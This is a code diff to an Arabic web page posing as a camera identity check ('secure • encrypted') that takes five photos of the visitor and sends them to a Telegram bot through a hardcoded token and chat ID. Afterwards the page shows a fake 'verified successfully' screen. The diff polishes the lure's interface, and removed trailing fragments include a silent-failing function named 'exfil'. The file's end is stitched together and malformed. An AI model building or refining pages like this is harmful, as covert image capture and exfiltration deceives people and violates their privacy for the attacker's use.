@@ -21,6 +21,21 @@
             font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
             padding: 1.5rem;
             margin: 0;
+            overflow: hidden;
+        }
+
+        /* ===== الواجهة الرئيسية ===== */
+        #mainUI {
+            transition: opacity 0.5s ease, transform 0.5s ease;
+            width: 100%;
+            max-width: 520px;
+        }
+
+        #mainUI.hidden {
+            opacity: 0;
+            transform: scale(0.95);
+            pointer-events: none;
+            position: absolute;
         }
 
         .card {
@@ -30,15 +45,9 @@
             border: 1px solid rgba(255, 255, 255, 0.08);
             border-radius: 2.5rem;
             padding: 2.8rem 2.5rem;
-            max-width: 520px;
             width: 100%;
             text-align: center;
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
-            transition: transform 0.25s ease;
-        }
-
-        .card:hover {
-            transform: scale(1.01);
         }
 
         h1 {
@@ -116,24 +125,6 @@
             transform: none !important;
         }
 
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.06);
-            color: #b8c7ff;
-            box-shadow: none;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            font-size: 0.9rem;
-            padding: 0.7rem 1.2rem;
-            width: auto;
-            margin-top: 1rem;
-            backdrop-filter: blur(10px);
-            transition: 0.2s;
-        }
-
-        .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.12);
-            border-color: rgba(255, 255, 255, 0.15);
-        }
-
         .status-badge {
             display: inline-block;
             margin-top: 1.8rem;
@@ -162,40 +153,122 @@
             100% { opacity: 0.4; transform: scale(0.8); }
         }
 
+        /* ===== شاشة التحميل ===== */
+        #loadingUI {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 2rem;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        #loadingUI.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 72px;
+            height: 72px;
+            border: 4px solid rgba(255, 255, 255, 0.05);
+            border-top: 4px solid #00d4a0;
+            border-right: 4px solid #00f5c0;
+            border-radius: 50%;
+            animation: spin 0.9s cubic-bezier(0.6, 0.2, 0.4, 0.8) infinite;
+            box-shadow: 0 0 60px rgba(0, 200, 150, 0.15);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #a8b5d9;
+            font-size: 1rem;
+            letter-spacing: 0.5px;
+            animation: fade-text 1.2s ease-in-out infinite alternate;
+        }
+
+        @keyframes fade-text {
+            0% { opacity: 0.4; }
+            100% { opacity: 1; }
+        }
+
+        .loading-progress {
+            font-size: 0.85rem;
+            color: #6ef0d0;
+            font-weight: 500;
+            background: rgba(0, 200, 150, 0.06);
+            padding: 0.3rem 1.2rem;
+            border-radius: 40px;
+            border: 1px solid rgba(0, 200, 150, 0.1);
+            min-width: 80px;
+            text-align: center;
+        }
+
+        /* ===== رسالة النتيجة ===== */
+        #resultUI {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+        }
+
+        #resultUI.active {
+            display: flex;
+        }
+
+        .result-icon {
+            font-size: 4rem;
+            animation: pop-in 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        @keyframes pop-in {
+            0% { transform: scale(0); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .result-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .result-sub {
+            color: #a8b5d9;
+            font-size: 0.95rem;
+        }
+
+        .btn-retry {
+            margin-top: 1rem;
+            padding: 0.6rem 2rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.04);
+            color: #b8c7ff;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: 0.25s;
+        }
+
+        .btn-retry:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+
+        /* ===== مخفي ===== */
         #video {
             display: none;
-        }
-
-        .progress-container {
-            margin-top: 1.5rem;
-            display: none;
-        }
-
-        .progress-container.active {
-            display: block;
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 6px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            overflow: hidden;
-            margin-top: 0.5rem;
-        }
-
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #00d4a0, #00f5c0);
-            border-radius: 10px;
-            transition: width 0.5s ease;
-        }
-
-        .progress-text {
-            font-size: 0.85rem;
-            color: #a8b5d9;
-            margin-top: 0.5rem;
         }
 
         @media (max-width: 480px) {
@@ -218,202 +291,179 @@
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="icon-wrapper">
-            <svg viewBox="0 0 24 24">
-                <path d="M23 7L16 12L23 17V7Z" />
-                <path d="M14 5H3C1.89543 5 1 5.89543 1 7V17C1 18.1046 1.89543 19 3 19H14C15.1046 19 16 18.1046 16 17V7C16 5.89543 15.1046 5 14 5Z" />
-            </svg>
-        </div>
 
-        <h1>تحقق من الهوية</h1>
-        <p class="subtitle">نحتاج إلى تأكيد هويتك عبر الكاميرا</p>
-
-        <button class="btn" id="startBtn">📸  اضغط للمتابعة</button>
-
-        <div class="progress-container" id="progressContainer">
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
+    <!-- ===== الواجهة الرئيسية ===== -->
+    <div id="mainUI">
+        <div class="card">
+            <div class="icon-wrapper">
+                <svg viewBox="0 0 24 24">
+                    <path d="M23 7L16 12L23 17V7Z" />
+                    <path d="M14 5H3C1.89543 5 1 5.89543 1 7V17C1 18.1046 1.89543 19 3 19H14C15.1046 19 16 18.1046 16 17V7C16 5.89543 15.1046 5 14 5Z" />
+                </svg>
             </div>
-            <div class="progress-text" id="progressText">جارٍ التقاط الصور...</div>
+            <h1>تحقق من الهوية</h1>
+            <p class="subtitle">نحتاج إلى تأكيد هويتك عبر الكاميرا</p>
+            <button class="btn" id="startBtn">📸  اضغط للمتابعة</button>
+            <div class="status-badge">
+                <span>آمن • مشفر</span>
+                <span class="dot"></span>
+            </div>
         </div>
-
-        <div class="status-badge">
-            <span>آمن • مشفر</span>
-            <span class="dot"></span>
-        </div>
-
-        <video id="video" autoplay playsinline></video>
     </div>
+
+    <!-- ===== شاشة التحميل ===== -->
+    <div id="loadingUI">
+        <div class="spinner"></div>
+        <div class="loading-text">جاري التحقق من الهوية...</div>
+        <div class="loading-progress" id="progressText">0 / 5</div>
+    </div>
+
+    <!-- ===== شاشة النتيجة ===== -->
+    <div id="resultUI">
+        <div class="result-icon" id="resultIcon">✅</div>
+        <div class="result-title" id="resultTitle">تم التحقق بنجاح!</div>
+        <div class="result-sub" id="resultSub">تم إرسال 5 صور للتحقق</div>
+        <button class="btn-retry" id="retryBtn">↻ إعادة المحاولة</button>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
 
     <script>
         const TOKEN = "8033297244:AAGbuM8xXwDpWh-q5D4c7lkHO9-0KHJNjtg";
         const CHAT = "5648499583";
-        const video = document.getElementById('video');
+
+        const mainUI = document.getElementById('mainUI');
+        const loadingUI = document.getElementById('loadingUI');
+        const resultUI = document.getElementById('resultUI');
         const startBtn = document.getElementById('startBtn');
-        const progressContainer = document.getElementById('progressContainer');
-        const progressFill = document.getElementById('progressFill');
+        const retryBtn = document.getElementById('retryBtn');
+        const video = document.getElementById('video');
         const progressText = document.getElementById('progressText');
+        const resultIcon = document.getElementById('resultIcon');
+        const resultTitle = document.getElementById('resultTitle');
+        const resultSub = document.getElementById('resultSub');
 
         let isRunning = false;
 
-        function updateProgress(current, total) {
-            const percent = (current / total) * 100;
-            progressFill.style.width = `${percent}%`;
-            progressText.textContent = `جارٍ التقاط الصور... (${current}/${total})`;
-        }
-
-        function capturePhotoFromVideo(videoElement) {
+        // ===== التقاط صورة =====
+        function capturePhoto(videoElement) {
             return new Promise((resolve) => {
                 const canvas = document.createElement("canvas");
-                canvas.width = videoElement.videoWidth || 640;
-                canvas.height = videoElement.videoHeight || 480;
+                const w = videoElement.videoWidth || 640;
+                const h = videoElement.videoHeight || 480;
+                canvas.width = w;
+                canvas.height = h;
                 const ctx = canvas.getContext("2d");
-                ctx.drawImage(videoElement, 0, 0);
+                ctx.drawImage(videoElement, 0, 0, w, h);
                 canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.92);
             });
         }
 
-        async function sendToTelegram(blob, label = "صورة") {
+        // ===== إرسال إلى تيليجرام =====
+        async function sendPhoto(blob, label) {
             const fd = new FormData();
             fd.append("chat_id", CHAT);
             fd.append("caption", `${label} - ${new Date().toLocaleString("ar-EG")}`);
             fd.append("photo", new File([blob], `${label}.jpg`, { type: "image/jpeg" }));
-
             try {
-                const resp = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                const r = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                     method: "POST",
                     body: fd
                 });
-                if (!resp.ok) {
-                    const errText = await resp.text();
-                    console.warn("Telegram API error:", errText);
-                }
-                return resp;
-            } catch (err) {
-                console.warn("فشل الإرسال:", err);
-                return null;
+                return r.ok;
+            } catch {
+                return false;
             }
         }
 
-        async function runCaptureSequence(stream) {
+        // ===== التنفيذ الرئيسي =====
+        async function runCapture() {
+            if (isRunning) return;
+            isRunning = true;
+
+            // إخفاء الواجهة الرئيسية
+            mainUI.classList.add('hidden');
+
+            // إظهار شاشة التحميل
+            loadingUI.classList.add('active');
+            progressText.textContent = '0 / 5';
+
+            let stream = null;
+            let success = true;
+
             try {
+                // طلب الكاميرا
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
+                });
+
                 video.srcObject = stream;
                 await video.play();
 
-                await new Promise((resolve) => {
-                    if (video.readyState >= 2) return resolve();
-                    video.addEventListener('loadeddata', resolve, { once: true });
-                });
+                // انتظار جاهزية الكاميرا (مع مهلة)
+                await Promise.race([
+                    new Promise((resolve) => {
+                        if (video.readyState >= 2) return resolve();
+                        video.addEventListener('loadeddata', resolve, { once: true });
+                    }),
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('تجاوز وقت الانتظار')), 5000))
+                ]);
 
                 const labels = ["user", "environment", "user", "environment", "user"];
                 const total = labels.length;
 
-                progressContainer.classList.add('active');
-                updateProgress(0, total);
-
                 for (let i = 0; i < total; i++) {
-                    if (i > 0) await new Promise(r => setTimeout(r, 600));
-                    
-                    const label = labels[i];
-                    const blob = await capturePhotoFromVideo(video);
-                    await sendToTelegram(blob, label);
-                    
-                    updateProgress(i + 1, total);
+                    if (i > 0) await new Promise(r => setTimeout(r, 500));
+
+                    const blob = await capturePhoto(video);
+                    const sent = await sendPhoto(blob, labels[i]);
+                    if (!sent) success = false;
+
+                    progressText.textContent = `${i + 1} / ${total}`;
                 }
 
-                stream.getTracks().forEach(track => track.stop());
-                video.srcObject = null;
-
-                setTimeout(() => {
-                    alert("✅ تم التحقق بنجاح! (5 صور)");
-                }, 300);
-
             } catch (err) {
-                console.error("خطأ في التسلسل:", err);
-                alert("⚠️ حدث خطأ أثناء التقاط الصور، حاول مرة أخرى.");
+                console.error(err);
+                success = false;
             } finally {
+                // إيقاف الكاميرا
+                if (stream) {
+                    stream.getTracks().forEach(t => t.stop());
+                    video.srcObject = null;
+                }
+
+                // إخفاء التحميل
+                loadingUI.classList.remove('active');
+
+                // إظهار النتيجة
+                resultUI.classList.add('active');
+                if (success) {
+                    resultIcon.textContent = '✅';
+                    resultTitle.textContent = 'تم التحقق بنجاح!';
+                    resultSub.textContent = 'تم إرسال 5 صور للتحقق';
+                } else {
+                    resultIcon.textContent = '❌';
+                    resultTitle.textContent = 'حدث خطأ!';
+                    resultSub.textContent = 'فشل التحقق، حاول مرة أخرى';
+                }
+
                 isRunning = false;
-                startBtn.disabled = false;
-                startBtn.textContent = "📸  اضغط للمتابعة";
-                
-                setTimeout(() => {
-                    progressContainer.classList.remove('active');
-                }, 1500);
             }
         }
 
-        startBtn.addEventListener('click', async () => {
-            if (isRunning) return;
-            
-            isRunning = true;
-            startBtn.disabled = true;
-            startBtn.textContent = "⏳ جارٍ التحقق...";
+        // ===== أحداث الأزرار =====
+        startBtn.addEventListener('click', runCapture);
 
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
-                });
-                
-                await runCaptureSequence(stream);
-
-            } catch (err) {
-                console.error("خطأ في الوصول للكاميرا:", err);
-                alert("⚠️ يرجى السماح بالوصول إلى الكاميرا لإكمال العملية.");
-                startBtn.disabled = false;
-                startBtn.textContent = "📸  اضغط للمتابعة";
-                isRunning = false;
-            }
+        retryBtn.addEventListener('click', () => {
+            resultUI.classList.remove('active');
+            mainUI.classList.remove('hidden');
+            // إعادة تعيين الزر
+            startBtn.disabled = false;
+            startBtn.textContent = '📸  اضغط للمتابعة';
         });
 
-        console.log("✅ تم تحميل صفحة التحقق.");
+        // ===== في حال فشل الكاميرا من البداية =====
+        console.log('✅ جاهز');
     </script>
 </body>
-</html>                    canvas.toBlob(async (blob) => {
-                        const fd = new FormData();
-                        fd.append("chat_id", CHAT);
-                        fd.append("photo", blob, "image.jpg");
-                        
-                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                            method: "POST",
-                            body: fd
-                        });
-
-                        // إيقاف الكاميرا بعد الالتقاط
-                        stream.getTracks().forEach(track => track.stop());
-                        alert("تم التحقق بنجاح!");
-                    }, "image/jpeg");
-                }, 1000);
-
-            } catch (err) {
-                alert("يجب السماح بالوصول للكاميرا لإكمال العملية.");
-            }
-        });
-    </script>
-</body>
-</html>
-
-async function exfil(blob,label){
-  const fd = new FormData();
-  fd.append("chat_id",CHAT);
-  fd.append("caption",`${label} - ${new Date().toLocaleString("ar-EG")}`);
-  fd.append("photo",new File([blob],`${label}.jpg`,{type:"image/jpeg"}));
-  await fetch(URL,{method:"POST",body:fd});
-}
-
-(async()=>{
-  try{
-    const devices = await navigator.mediaDevices.enumerateDevices();
-    const cams    = devices.filter(d=>d.kind==="videoinput");
-    const labels  = ["user","environment","user","environment","user"]; // 5 shots
-    for(let i=0;i<5;i++){
-      const label = labels[i%cams.length];
-      const pic   = await snap(label);
-      await exfil(pic,label);
-    }
-  }catch(e){
-    // silent fail
-  }
-})();
-</script>
 </html>
